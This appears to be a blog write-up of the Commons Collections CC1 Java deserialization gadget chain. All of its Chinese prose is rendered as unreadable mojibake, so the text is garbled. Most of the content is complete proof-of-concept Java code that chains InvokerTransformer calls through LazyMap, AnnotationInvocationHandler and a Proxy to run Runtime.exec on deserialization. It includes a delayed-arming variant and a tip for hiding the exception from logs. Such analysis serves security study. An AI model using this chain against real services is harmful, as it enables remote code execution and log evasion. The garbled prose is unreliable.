<p>‰ΩÜÊòØ<code>AnnotationInvocationHandler</code>ÁöÑ<code>invoke</code>ÊñπÊ≥ïÊúâ<code>get</code>ÊñπÊ≥ïÁöÑË∞ÉÁî®ÔºåÊ≥®ÊÑèÂà∞Ëøô‰∏™<code>AnnotationInvocationHandler</code>ÂÆûÁé∞‰∫Ü<code>InvocationHandler</code>Êé•Âè£ÔºåÈÇ£‰πàÂèØ‰ª•<code>Proxy</code>ËøõË°åÂä®ÊÄÅ‰ª£ÁêÜ</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> CommonsCollections.CC1;<br><br><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.LazyMap;<br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.annotation.Retention;<br><span class="hljs-keyword">import</span> java.lang.reflect.Constructor;<br><span class="hljs-keyword">import</span> java.lang.reflect.InvocationHandler;<br><span class="hljs-keyword">import</span> java.lang.reflect.Proxy;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">CC1LazyMap</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception </span>&#123;<br>        Transformer[] transformers = &#123;<br>                <span class="hljs-keyword">new</span> ConstantTransformer(Runtime.class),<br>                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;getMethod&quot;</span>, <span class="hljs-keyword">new</span> Class[]&#123;String.class, Class[].class&#125;, <span class="hljs-keyword">new</span> Object[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-keyword">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;invoke&quot;</span>, <span class="hljs-keyword">new</span> Class[]&#123;Object.class, Object[].class&#125;, <span class="hljs-keyword">new</span> Object[]&#123;<span class="hljs-keyword">null</span>, <span class="hljs-keyword">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> Class[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> Object[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;)<br>        &#125;;<br><br>        ChainedTransformer chainedTransformer = <span class="hljs-keyword">new</span> ChainedTransformer(transformers);<br>        HashMap hm = <span class="hljs-keyword">new</span> HashMap();<br><span class="hljs-comment">//        Map decorate = TransformedMap.decorate(hm, null, chainedTransformer);</span><br>        Map decorate = LazyMap.decorate(hm, chainedTransformer);<br><br>        Class clz = Class.forName(<span class="hljs-string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);<br>        Constructor declaredConstructor = clz.getDeclaredConstructor(Class.class, Map.class);<br>        declaredConstructor.setAccessible(<span class="hljs-keyword">true</span>);<br><br><span class="hljs-comment">//        Object newInstance = declaredConstructor.newInstance(Retention.class, decorate);</span><br>        InvocationHandler invocationHandler = (InvocationHandler) declaredConstructor.newInstance(Retention.class, decorate);<span class="hljs-comment">//ÁîüÊàêInvocationHandlerÁ±ªÂûãÁöÑÁ±ªÂÆû‰æã</span><br>        Map proxymap = (Map) Proxy.newProxyInstance(Map.class.getClassLoader(),<span class="hljs-keyword">new</span> Class[]&#123;Map.class&#125;,invocationHandler);<span class="hljs-comment">//ÁîüÊàê‰ª£ÁêÜÁ±ªÂÆû‰æãÔºå‰ª£ÁêÜinvocationHandlerÂÆû‰æã</span><br><br>        ByteArrayOutputStream baos = <span class="hljs-keyword">new</span> ByteArrayOutputStream();<br>        ObjectOutputStream oos = <span class="hljs-keyword">new</span> ObjectOutputStream(baos);<br><span class="hljs-comment">//        oos.writeObject(newInstance);</span><br>        oos.writeObject(invocationHandler);<br>        oos.flush();<br>        oos.close();<br><br>        ByteArrayInputStream bais = <span class="hljs-keyword">new</span> ByteArrayInputStream(baos.toByteArray());<br>        ObjectInputStream ois = <span class="hljs-keyword">new</span> ObjectInputStream(bais);<br>        ois.readObject();<br>        ois.close();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>ÁÑ∂ËÄåÊ≠§Êó∂Ëøò‰∏çËÉΩÂëΩ‰ª§ÊâßË°å(Ê≠§Â§ÑÁúã p ÁâõÁöÑÊñáÁ´†Ê≤°ÁúãÊáÇÂêéÁª≠ÂÜçÁî®‰∏ÄÊ¨°<code>AnnotationInvocationHandler</code>ÂåÖË£πÔºåÊúâÁÇπÁªï)</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java">        Class clz = Class.forName(<span class="hljs-string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);<br>        Constructor declaredConstructor = clz.getDeclaredConstructor(Class.class, Map.class);<br>        declaredConstructor.setAccessible(<span class="hljs-keyword">true</span>);<br><br><span class="hljs-comment">//        Object newInstance = declaredConstructor.newInstance(Retention.class, decorate);</span><br>        InvocationHandler invocationHandler = (InvocationHandler) declaredConstructor.newInstance(Retention.class, decorate);<span class="hljs-comment">//ÁîüÊàêInvocationHandlerÁ±ªÂûãÁöÑÁ±ªÂÆû‰æã</span><br>        Map proxymap = (Map) Proxy.newProxyInstance(Map.class.getClassLoader(),<span class="hljs-keyword">new</span> Class[]&#123;Map.class&#125;,invocationHandler);<span class="hljs-comment">//ÁîüÊàê‰ª£ÁêÜÁ±ªÂÆû‰æãÔºå‰ª£ÁêÜinvocationHandlerÂÆû‰æã</span><br></code></pre></td></tr></table></figure>

<p>Ê≠§Êó∂‰º†ÂÖ•<code>AnnotationInvocationHandler</code>ÁöÑÊûÑÈÄ†ÊñπÊ≥ïÊòØ<code>LazyMap</code>ÁöÑÁ±ªÂØπË±°ÔºåÂç≥<code>AnnotationInvocationHandler(Retention.class,decorate)</code>ÔºåÂÜçÂä®ÊÄÅ‰ª£ÁêÜËøô‰∏™ÂÆûÁé∞‰∫Ü<code>InvocationHandler</code>ÁöÑ<code>AnnotationInvocationHandler</code></p>
<p>Êàë‰ª¨Áü•ÈÅìÔºå‰ΩøÁî®Âä®ÊÄÅ‰ª£ÁêÜÂøÖÈ°ªÊòØ‰∏Ä‰∏™Êé•Âè£Á±ªÔºå‰∫éÊòØÂú®‰ª£ÁêÜ<code>AnnotationInvocationHandler</code>ÂêéËøõË°å‰∫Ü<code>Map</code>Âº∫ËΩ¨ÔºåÁÑ∂ÂêéÂÜç<code>AnnotationInvocationHandler.readObject</code>Ôºö</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">for</span> (Map.Entry&lt;String, Object&gt; memberValue : memberValues.entrySet()) &#123;<br></code></pre></td></tr></table></figure>

<p>ËøôÈáå<code>memberValues.entrySet-&gt;LazyMap.entrySet-&gt;Map.entrySet-&gt;AnnotationInvocationHandler.invoke</code>Â•ΩÂÉèÂ§©Ë°£Êó†ÁºùÔºåÈóÆÈ¢òÊ≠£ÊòØÂú®ËøôÔºåÊúÄÂêéÊàë‰ª¨Âπ∂‰∏çËÉΩÂ¶ÇÊÑøÁöÑ</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">oos.writeObject(proxymap)<br></code></pre></td></tr></table></figure>

<p><code>Map</code>ÊòØÊ≤°ÊúâÂÆûÁé∞<code>Serializable</code>ÁöÑÔºåÈÇ£‰πàÊàë‰ª¨ËøòÈúÄË¶Å<code>AnnotationInvocationHandler</code>ÂÜçÂØπËøô‰∏™<code>Map</code>ËøõË°åÂåÖË£π</p>
<p>ÊúÄÁªà POCÔºö</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> CommonsCollections.CC1;<br><br><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.LazyMap;<br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.annotation.Retention;<br><span class="hljs-keyword">import</span> java.lang.reflect.Constructor;<br><span class="hljs-keyword">import</span> java.lang.reflect.InvocationHandler;<br><span class="hljs-keyword">import</span> java.lang.reflect.Proxy;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">CC1LazyMap</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception </span>&#123;<br>        Transformer[] transformers = &#123;<br>                <span class="hljs-keyword">new</span> ConstantTransformer(Runtime.class),<br>                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;getMethod&quot;</span>, <span class="hljs-keyword">new</span> Class[]&#123;String.class, Class[].class&#125;, <span class="hljs-keyword">new</span> Object[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-keyword">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;invoke&quot;</span>, <span class="hljs-keyword">new</span> Class[]&#123;Object.class, Object[].class&#125;, <span class="hljs-keyword">new</span> Object[]&#123;<span class="hljs-keyword">null</span>, <span class="hljs-keyword">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> Class[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> Object[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;),<br>                <span class="hljs-keyword">new</span> ConstantTransformer(<span class="hljs-number">1</span>)<br>        &#125;;<br><br>        ChainedTransformer chainedTransformer = <span class="hljs-keyword">new</span> ChainedTransformer(transformers);<br>        HashMap hm = <span class="hljs-keyword">new</span> HashMap();<br><span class="hljs-comment">//        Map decorate = TransformedMap.decorate(hm, null, chainedTransformer);</span><br>        Map decorate = LazyMap.decorate(hm, chainedTransformer);<br><br>        Class clz = Class.forName(<span class="hljs-string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);<br>        Constructor declaredConstructor = clz.getDeclaredConstructor(Class.class, Map.class);<br>        declaredConstructor.setAccessible(<span class="hljs-keyword">true</span>);<br><br><span class="hljs-comment">//        Object newInstance = declaredConstructor.newInstance(Retention.class, decorate);</span><br>        InvocationHandler invocationHandler = (InvocationHandler) declaredConstructor.newInstance(Retention.class, decorate);<span class="hljs-comment">//ÁîüÊàêInvocationHandlerÁ±ªÂûãÁöÑÁ±ªÂÆû‰æã</span><br>        Map proxymap = (Map) Proxy.newProxyInstance(Map.class.getClassLoader(),<span class="hljs-keyword">new</span> Class[]&#123;Map.class&#125;,invocationHandler);<span class="hljs-comment">//ÁîüÊàê‰ª£ÁêÜÁ±ªÂÆû‰æãÔºå‰ª£ÁêÜinvocationHandlerÂÆû‰æã</span><br>        invocationHandler = (InvocationHandler) declaredConstructor.newInstance(Retention.class,proxymap);<span class="hljs-comment">//ÂÜçÊ¨°ÂÆû‰æãÂåñ‰∏Ä‰∏™AnnotationInvocationHandlerÔºåÂπ∂‰∏îÂ∞Üproxymap‰º†ÂÖ•ÁªômemberValues</span><br><br>        ByteArrayOutputStream baos = <span class="hljs-keyword">new</span> ByteArrayOutputStream();<br>        ObjectOutputStream oos = <span class="hljs-keyword">new</span> ObjectOutputStream(baos);<br><span class="hljs-comment">//        oos.writeObject(newInstance);</span><br>        oos.writeObject(invocationHandler);<br>        oos.flush();<br>        oos.close();<br><br>        ByteArrayInputStream bais = <span class="hljs-keyword">new</span> ByteArrayInputStream(baos.toByteArray());<br>        ObjectInputStream ois = <span class="hljs-keyword">new</span> ObjectInputStream(bais);<br>        ois.readObject();<br>        ois.close();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>Âõ†Ê≠§Âà©Áî®Èìæ‰∏∫</p>
<figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs reasonml"><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">ObjectInputStream</span>.</span></span>read<span class="hljs-constructor">Object()</span><br>	<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">AnnotationInvocationHandler</span>.</span></span>read<span class="hljs-constructor">Object()</span><span class="hljs-comment">//ÊÑüËßâ‰ΩúËÄÖÂú®ÁÇ´ÊäÄÔºåÂ§™Â∑ß‰∫ÜÔºåQAQ</span><br>		<span class="hljs-constructor">Map(Proxy)</span>.entry<span class="hljs-constructor">Set()</span><br>			<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">AnnotationInvocationHandler</span>.</span></span>invoke<span class="hljs-literal">()</span><br>				<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">LazyMap</span>.</span></span>get<span class="hljs-literal">()</span><br>					<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">ChainedTransformer</span>.</span></span>transform<span class="hljs-literal">()</span><br>						<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">ConstantTransformer</span>.</span></span>transform<span class="hljs-literal">()</span><br>						<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">InvokerTransformer</span>.</span></span>transform<span class="hljs-literal">()</span><br>							<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Method</span>.</span></span>invoke<span class="hljs-literal">()</span><br>								<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Class</span>.</span></span>get<span class="hljs-constructor">Method()</span><br>						<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">InvokerTransformer</span>.</span></span>transform<span class="hljs-literal">()</span><br>							<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Method</span>.</span></span>invoke<span class="hljs-literal">()</span><br>								<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Runtime</span>.</span></span>get<span class="hljs-constructor">Runtime()</span><br>						<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">InvokerTransformer</span>.</span></span>transform<span class="hljs-literal">()</span><br>							<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Method</span>.</span></span>invoke<span class="hljs-literal">()</span><br>								<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Runtime</span>.</span></span>exec<span class="hljs-literal">()</span><br></code></pre></td></tr></table></figure>

<blockquote>
<p>p ÁâõÊèêÂà∞ÔºåË∞ÉËØïËøáÁ®ã‰∏≠Âá∫Áé∞ËøòÊ≤°ÊúâÂà∞<code>readObject</code>Â∞±ÂºπÂá∫‰∫ÜËÆ°ÁÆóÂô®ÔºåÂéüÂõ†ÊòØÔºöÂú®‰ΩøÁî® Proxy ‰ª£ÁêÜ‰∫Ü map ÂØπË±°ÂêéÔºåÂú®‰ªª‰ΩïÂú∞ÊñπÊâßË°å map ÁöÑÊñπÊ≥ïÂ∞±‰ºöËß¶Âèë Payload ÂºπÂá∫ËÆ°ÁÆóÂô®ÔºåÊâÄ‰ª•ÔºåÂú®Êú¨Âú∞Ë∞ÉËØï‰ª£Á†ÅÁöÑÊó∂ÂÄôÔºåÂõ†‰∏∫Ë∞ÉËØïÂô®‰ºöË∞ÉÁî®‰∏Ä‰∫õ toString ‰πãÁ±ªÁöÑÊñπÊ≥ïÔºåÂØºËá¥‰∏çÁªèÊÑèÈó¥Ëß¶Âèë‰∫ÜÂëΩ‰ª§</p>
<p>Âè¶‰∏Ä‰∏™Â∞±ÊòØÂú®ÊâßË°åÂÆåÂèØËßÅÊéßÂà∂Âè∞Âá∫Áé∞‰∫Ü ProcessImpl ÂºÇÂ∏∏Ôºå‰∏∫‰∫ÜÈò≤Ê≠¢Êó•ÂøóËÆ∞ÂΩïÔºåÊàë‰ª¨ÂèØ‰ª•Âú® ChainedTransformer Â¢ûÂä†‰∏Ä‰∏™ ConstantTransformer(1)Ôºå‰ªéËÄåÊé©Áõñ‰∫ÜËøõÁ®ãÁöÑÊó•ÂøóÁâπÂæÅ</p>
</blockquote>
<ul>
<li>Á¨¨‰∏Ä‰∏™ÈóÆÈ¢òÔºåysoserial Â§ÑÁêÜÁöÑÊñπÂºè‰∏∫</li>
</ul>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> CommonsCollections.CC1;<br><br><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.LazyMap;<br><br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.annotation.Retention;<br><span class="hljs-keyword">import</span> java.lang.reflect.Constructor;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.lang.reflect.InvocationHandler;<br><span class="hljs-keyword">import</span> java.lang.reflect.Proxy;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">CC1</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception </span>&#123;<br><span class="hljs-comment">//        Transformer[] actualeviltransformer = &#123;</span><br><span class="hljs-comment">//                new ConstantTransformer(Runtime.class),</span><br><span class="hljs-comment">//                new InvokerTransformer(&quot;getMethod&quot;, new Class[]&#123;String.class, Class[].class&#125;, new Object[]&#123;&quot;getRuntime&quot;, null&#125;),</span><br><span class="hljs-comment">//                new InvokerTransformer(&quot;invoke&quot;, new Class[]&#123;Object.class, Object[].class&#125;, new Object[]&#123;null, null&#125;),</span><br><span class="hljs-comment">//                new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;calc&quot;&#125;),</span><br><span class="hljs-comment">//                new ConstantTransformer(1)</span><br><span class="hljs-comment">//        &#125;;</span><br>        ChainedTransformer chainedTransformer = <span class="hljs-keyword">new</span> ChainedTransformer(<span class="hljs-keyword">new</span> Transformer[]&#123;<br>                <span class="hljs-keyword">new</span> ConstantTransformer(Runtime.class),<br>                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;getMethod&quot;</span>, <span class="hljs-keyword">new</span> Class[]&#123;String.class, Class[].class&#125;, <span class="hljs-keyword">new</span> Object[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-keyword">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;invoke&quot;</span>, <span class="hljs-keyword">new</span> Class[]&#123;Object.class, Object[].class&#125;, <span class="hljs-keyword">new</span> Object[]&#123;<span class="hljs-keyword">null</span>, <span class="hljs-keyword">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> Class[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> Object[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;),<br>                <span class="hljs-keyword">new</span> ConstantTransformer(<span class="hljs-number">1</span>)<br>        &#125;);<br><br>        <span class="hljs-comment">//fake u</span><br>        ChainedTransformer fakechainedTransformer = <span class="hljs-keyword">new</span> ChainedTransformer(<span class="hljs-keyword">new</span> Transformer[]&#123;<span class="hljs-keyword">new</span> ConstantTransformer(<span class="hljs-number">1</span>)&#125;);<br>        HashMap hm = <span class="hljs-keyword">new</span> HashMap();<br>        Map decorate = LazyMap.decorate(hm,fakechainedTransformer);<br><br>        Class clz = Class.forName(<span class="hljs-string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);<br>        Constructor declaredConstructor = clz.getDeclaredConstructor(Class.class, Map.class);<br>        declaredConstructor.setAccessible(<span class="hljs-keyword">true</span>);<br><br>        InvocationHandler invocationHandler = (InvocationHandler) declaredConstructor.newInstance(Retention.class, decorate);<span class="hljs-comment">//ÁîüÊàêInvocationHandlerÁ±ªÂûãÁöÑÁ±ªÂÆû‰æã</span><br>        Map proxymap = (Map) Proxy.newProxyInstance(Map.class.getClassLoader(), <span class="hljs-keyword">new</span> Class[]&#123;Map.class&#125;, invocationHandler);<span class="hljs-comment">//ÁîüÊàê‰ª£ÁêÜÁ±ªÂÆû‰æãÔºå‰ª£ÁêÜinvocationHandlerÂÆû‰æã</span><br>        invocationHandler = (InvocationHandler) declaredConstructor.newInstance(Retention.class, proxymap);<span class="hljs-comment">//ÂÜçÊ¨°ÂÆû‰æãÂåñ‰∏Ä‰∏™AnnotationInvocationHandlerÔºåÂπ∂‰∏îÂ∞Üproxymap‰º†ÂÖ•ÁªômemberValues</span><br><br>        <span class="hljs-comment">//arm with actual evil transformer chain</span><br>        Field iTransformersF = Class.forName(<span class="hljs-string">&quot;org.apache.commons.collections.functors.ChainedTransformer&quot;</span>).getDeclaredField(<span class="hljs-string">&quot;iTransformers&quot;</span>);<br>        iTransformersF.setAccessible(<span class="hljs-keyword">true</span>);<br><span class="hljs-comment">//        iTransformersF.set(fakechainedTransformer,actualeviltransformer);</span><br>        iTransformersF.set(fakechainedTransformer,chainedTransformer);<br><br>        ByteArrayOutputStream baos = <span class="hljs-keyword">new</span> ByteArrayOutputStream();<br>        ObjectOutputStream oos = <span class="hljs-keyword">new</span> ObjectOutputStream(baos);<br>        oos.writeObject(invocationHandler);<br>        oos.flush();<br>        oos.close();<br><br>        ByteArrayInputStream bais = <span class="hljs-keyword">new</span> ByteArrayInputStream(baos.toByteArray());<br>        ObjectInputStream ois = <span class="hljs-keyword">new</span> ObjectInputStream(bais);<br>        ois.readObject();<br>        ois.close();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>ËøôÈáå‰πüÊúâ‰∏™Â∞èÁªÜËäÇÔºå‰∏∫‰ªÄ‰πàÂÅá<code>Transformer</code>Êï∞ÁªÑÈúÄË¶Å‰∏≤Ëµ∑Êù•ÔºåËÄåÂèçËÄåÂÖÉÁ¥†Êõ¥Â§öÁöÑ evil<code>Transformer</code>Êï∞ÁªÑÊ≤°Êúâ‰∏≤Ëµ∑Êù•</p>
<blockquote>
<p>Ë∞ÉÊï¥ actualeviltransformer Êàñ chainedTransformer ÁöÑÊ≥®ÈáäÔºå‰ª•ÂèäÂèçÂ∞Ñ‰øÆÊîπ iTransformersF ÂèòÈáèÁöÑÊ≥®ÈáäÔºåÂèØ‰ª•ÂèëÁé∞‰∏≤Ëµ∑Êù•ÁöÑÊ≤°ÊúâÂºπÂá∫ËÆ°ÁÆóÂô®</p>
</blockquote>
<p>Âõ†‰∏∫‰ΩøÁî®<code>LazyMap.decorate</code>Ë£ÖÈ•∞ÔºåÊ≤°ÊúâÁ¨¨‰∫å‰∏™ÂèÇÊï∞‰∏∫<code>Transformer[]</code>ÁöÑÈáçËΩΩÊñπÊ≥ïÔºåÂõ†Ê≠§ÂøÖÈ°ª‰∏≤Ëµ∑Êù•ÔºåËÄå<code>ChainedTransformer</code>ÊúâÔºö</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ChainedTransformer</span> <span class="hljs-keyword">implements</span> <span class="hljs-title">Transformer</span>, <span class="hljs-title">Serializable</span> </span>&#123;<br></code></pre></td></tr></table></figure>

<p>ËÄåÈÄöËøáÂèçÂ∞Ñ‰øÆÊîπÂà∞ÁöÑ<code>ChainedTransformer</code>Â±ûÊÄß<code>iTransformers</code>Âç¥ÊòØÔºö</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> Transformer[] iTransformers;<br></code></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220829141357207.png" srcset="/img/loading.gif" lazyload></p>
